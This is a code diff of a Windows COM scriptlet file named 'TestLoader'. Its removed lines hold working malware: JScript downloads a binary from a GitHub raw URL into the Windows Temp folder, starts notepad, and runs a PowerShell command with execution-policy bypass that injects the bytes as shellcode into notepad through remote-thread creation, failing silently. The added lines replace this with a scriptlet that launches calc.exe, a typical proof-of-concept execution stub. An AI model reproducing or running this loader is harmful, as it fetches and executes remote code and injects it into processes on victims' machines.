@@ -1,61 +1,11 @@
 <?XML version="1.0"?>
 <scriptlet>
-<registration
-    description="TestLoader"
-    progid="TestLoader"
-    version="1.00"
-    classid="{12345678-1234-1234-1234-123456789ABC}">
-    
-    <script language="JScript">
-        <![CDATA[
-            try {
-                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-                xhr.open("GET", "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin", false);
-                xhr.send();
-                
-                if (xhr.status == 200) {
-                    var shell = new ActiveXObject("WScript.Shell");
-                    var tempFile = "C:\\Windows\\Temp\\loader.bin";
-                    
-                    var stream = new ActiveXObject("ADODB.Stream");
-                    stream.Open();
-                    stream.Type = 1;
-                    stream.Write(xhr.responseBody);
-                    stream.SaveToFile(tempFile, 2);
-                    stream.Close();
-                    
-                    shell.Run("notepad.exe", 1, true);
-                    
-                    var psCommand = 
-                        "$code = [System.IO.File]::ReadAllBytes('" + tempFile + "'); " +
-                        "Add-Type -TypeDefinition @' " +
-                        "using System; using System.Runtime.InteropServices; using System.Diagnostics; " +
-                        "public class Inject { " +
-                        "[DllImport(\"kernel32.dll\")] " +
-                        "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId); " +
-                        "[DllImport(\"kernel32.dll\")] " +
-                        "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); " +
-                        "[DllImport(\"kernel32.dll\")] " +
-                        "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten); " +
-                        "[DllImport(\"kernel32.dll\")] " +
-                        "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); " +
-                        "public static void Execute(byte[] shellcode) { " +
-                        "var procs = Process.GetProcessesByName(\"notepad\"); " +
-                        "if (procs.Length > 0) { " +
-                        "IntPtr hProcess = OpenProcess(0x1F0FFF, false, procs[0].Id); " +
-                        "IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40); " +
-                        "UIntPtr bytesWritten; " +
-                        "WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten); " +
-                        "CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); " +
-                        "}} '@; " +
-                        "[Inject]::Execute($code);";
-                    
-                    shell.Run("powershell -exec bypass -Command \"" + psCommand + "\"", 1, true);
-                }
-            } catch(e) {
-                // Continue silently
-            }
-        ]]>
-    </script>
+<registration description="Test" progid="Test" version="1.00" classid="{11111111-1111-1111-1111-111111111111}">
+<script language="JScript">
+<![CDATA[
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("calc.exe", 1, true);
+]]>
+</script>
 </registration>
 </scriptlet>
